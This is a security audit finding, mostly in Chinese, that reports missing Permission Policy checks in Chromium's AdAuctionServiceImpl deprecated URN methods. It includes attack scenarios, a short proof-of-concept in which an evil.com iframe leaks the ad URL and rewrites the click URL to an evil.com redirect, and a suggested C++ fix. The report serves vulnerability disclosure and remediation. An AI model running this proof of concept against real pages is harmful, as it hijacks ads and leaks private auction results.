# Finding 004: AdAuctionServiceImpl — Permission Policy Bypass in DeprecatedReplaceInURN / DeprecatedGetURLFromURN

## 严重性: Medium-High

## 摘要

`AdAuctionServiceImpl` 的 `DeprecatedReplaceInURN` 和 `DeprecatedGetURLFromURN` 方法
缺少 `run-ad-auction` Permission Policy 检查。同一页面上任何 frame（包括没有
`run-ad-auction` 权限的第三方 iframe）都可以：

1. **篡改** 拍卖结果的 Fenced Frame URL 映射（通过 `DeprecatedReplaceInURN`）
2. **泄露** Fenced Frame URN 背后的实际广告 URL（通过 `DeprecatedGetURLFromURN`）
3. **触发** 拍卖报告发送（通过 `DeprecatedGetURLFromURN` 的 `send_reports` 参数）

## 受影响组件

- `content/browser/interest_group/ad_auction_service_impl.cc`
- Mojo 接口: `blink::mojom::AdAuctionService`

## 漏洞详情

### Permission Policy 检查不一致

| 方法 | Permission Policy 检查 | 其他安全检查 |
|------|----------------------|-------------|
| `JoinInterestGroup` | `kJoinAdInterestGroup` ✓ | HTTPS + IsInterestGroupAPIAllowed ✓ |
| `LeaveInterestGroup` | `kJoinAdInterestGroup` ✓ | HTTPS + IsInterestGroupAPIAllowed ✓ |
| `UpdateAdInterestGroups` | `kJoinAdInterestGroup` ✓ | IsInterestGroupAPIAllowed ✓ |
| `RunAdAuction` | `kRunAdAuction` ✓ | 完整检查 ✓ |
| `GetInterestGroupAdAuctionData` | `kRunAdAuction` ✓ | IsInterestGroupAPIAllowed ✓ |
| **`DeprecatedGetURLFromURN`** | **无** ❌ | 仅 URN 格式验证 |
| **`DeprecatedReplaceInURN`** | **无** ❌ | 仅 URN 格式验证 |
| `CreateAdRequest` | **无** ❌ | 仅输入格式验证（目前是 stub） |
| `FinalizeAd` | **无** ❌ | 仅 GUID 非空检查（目前是 stub） |

### Mojo Service 绑定无 Permission Policy 检查

```cpp
// browser_interface_binders.cc:1201
map->Add<blink::mojom::AdAuctionService>(
    &AdAuctionServiceImpl::CreateMojoService);

// ad_auction_service_impl.cc:190
void AdAuctionServiceImpl::CreateMojoService(
    RenderFrameHost* render_frame_host,
    mojo::PendingReceiver<blink::mojom::AdAuctionService> receiver) {
  CHECK(render_frame_host);
  // 没有 Permission Policy 检查！
  new AdAuctionServiceImpl(*render_frame_host, std::move(receiver));
}
```

### IDL 定义

```idl
// navigator_auction.idl:40-44
[RuntimeEnabled=AllowURNsInIframes, ...]
Promise<USVString> deprecatedURNToURL(UrnOrConfig urn_or_config, ...);

[RuntimeEnabled=AllowURNsInIframes, ...]
Promise<undefined> deprecatedReplaceInURN(UrnOrConfig urn_or_config, ...);
```

- `RuntimeEnabled=AllowURNsInIframes` — 默认 ENABLED (`FEATURE_ENABLED_BY_DEFAULT`)
- 没有 Permissions Policy 标注
- 没有 `[CrossOriginIsolated]`

### Fenced Frame URL Mapping 是 per-Page 共享的

```cpp
// ad_auction_service_impl.cc:585-589
content::FencedFrameURLMapping& mapping =
    static_cast<RenderFrameHostImpl&>(render_frame_host())
        .GetPage()  // ← 同一 tab 内所有 frame 共享同一个 Page
        .fenced_frame_urls_map();
mapping.SubstituteMappedURL(urn_url, local_replacements);
```

所有 frame（包括 cross-origin iframe）通过 `GetPage()` 访问同一个映射。

## 攻击场景

### 场景 1: 广告 URL 篡改（Medium-High）

1. 发布者 `publisher.com` 配置了 Permission Policy 允许 `adtech.com` 运行拍卖
2. `adtech.com` 的 iframe 调用 `runAdAuction()` — 生成 URN 映射到广告 URL
3. 该 URN 被传递给 `<fencedframe src="urn:uuid:xxx">` 加载广告
4. 页面上另一个第三方 iframe `tracker.com`（没有 `run-ad-auction` 权限）
5. `tracker.com` 知道 URN UUID（通过 `postMessage` 或猜测）
6. `tracker.com` 调用 `navigator.deprecatedReplaceInURN(urn, {"\${WINNER}": "evil.com"})` 
7. Fenced Frame URL 被修改 — 广告展示被劫持

### 场景 2: 广告 URL 信息泄露（Medium）

1. 发布者页面运行了 FLEDGE 拍卖
2. 第三方 iframe（无拍卖权限）调用 `navigator.deprecatedURNToURL(urn)` 
3. 获得 Fenced Frame 背后的实际广告 URL — 泄露拍卖结果
4. 这违反了 Fenced Frames 的隐私保证（URL 应该对嵌入页面不可见）

### 场景 3: 虚假报告触发（Low-Medium）

1. 第三方 iframe 调用 `navigator.deprecatedURNToURL(urn, true)` — `send_reports=true`
2. 触发拍卖的 `on_navigate_callback` — 发送报告到 SSP/DSP 服务器
3. 这些报告应该只在 Fenced Frame 实际导航时触发

## PoC 概念

### HTML (publisher.com)

```html
<!-- 合法的广告拍卖 iframe -->
<iframe src="https://adtech.com/auction.html"
  allow="run-ad-auction; join-ad-interest-group">
</iframe>

<!-- 恶意第三方 iframe — 注意没有 run-ad-auction 权限 -->
<iframe src="https://evil.com/hijack.html"
  allow="">
</iframe>
```

### JavaScript (evil.com/hijack.html)

```javascript
// 等待接收 URN（通过 postMessage 或其他方式）
window.addEventListener('message', async (e) => {
  const urn = e.data.urn;
  
  // 信息泄露 — 获取实际广告 URL
  const realUrl = await navigator.deprecatedURNToURL(urn);
  console.log('Leaked ad URL:', realUrl);
  
  // 篡改广告 URL
  await navigator.deprecatedReplaceInURN(urn, {
    '${CLICK_URL}': 'https://evil.com/redirect'
  });
});
```

## 前提和限制

1. **需要知道 URN UUID**: URN 是随机 UUID，攻击者需要通过某种方式获取。
   可能的途径：`postMessage`、DOM 属性泄露、Side-channel
2. **deprecated API**: 方法名含 "Deprecated"，可能计划移除，但当前功能完整
3. **`AllowURNsInIframes` 必须启用**: 当前默认启用
4. **替换模式限制**: 只能替换 `${...}` 或 `%%...%%` 格式的占位符，不能任意修改 URL

## 建议修复

```cpp
// ad_auction_service_impl.cc — DeprecatedGetURLFromURN
void AdAuctionServiceImpl::DeprecatedGetURLFromURN(
    const GURL& urn_url, bool send_reports,
    DeprecatedGetURLFromURNCallback callback) {
  if (!blink::IsValidUrnUuidURL(urn_url)) {
    ReportBadMessageAndDeleteThis("Unexpected request: invalid URN");
    return;
  }
  // 添加 Permission Policy 检查
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "DeprecatedGetURLFromURN")) {
    std::move(callback).Run(std::nullopt);
    return;
  }
  // ...
}

// ad_auction_service_impl.cc — DeprecatedReplaceInURN
void AdAuctionServiceImpl::DeprecatedReplaceInURN(
    const GURL& urn_url,
    const std::vector<blink::AuctionConfig::AdKeywordReplacement>& replacements,
    DeprecatedReplaceInURNCallback callback) {
  if (!blink::IsValidUrnUuidURL(urn_url)) {
    ReportBadMessageAndDeleteThis("Unexpected request: invalid URN");
    return;
  }
  // 添加 Permission Policy 检查
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "DeprecatedReplaceInURN")) {
    std::move(callback).Run();
    return;
  }
  // ...
}
```

## 对比其他有 Permission Policy 检查的方法

```cpp
// RunAdAuction (line 402) — 有检查
void AdAuctionServiceImpl::RunAdAuction(...) {
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "RunAdAuction")) {
    // ...
    return;
  }
  // ...
}

// DeprecatedReplaceInURN (line 572) — 无检查！
void AdAuctionServiceImpl::DeprecatedReplaceInURN(...) {
  if (!blink::IsValidUrnUuidURL(urn_url)) {
    ReportBadMessageAndDeleteThis("Unexpected request: invalid URN");
    return;
  }
  // 直接修改映射，没有任何权限检查
  mapping.SubstituteMappedURL(urn_url, local_replacements);
}
```

## 发现方法

通过系统性审计 `AdAuctionServiceImpl` 的所有 Mojo 方法的 Permission Policy 检查一致性发现。
这是 Pattern 2（新 API 方法缺少已有权限检查）的变体。
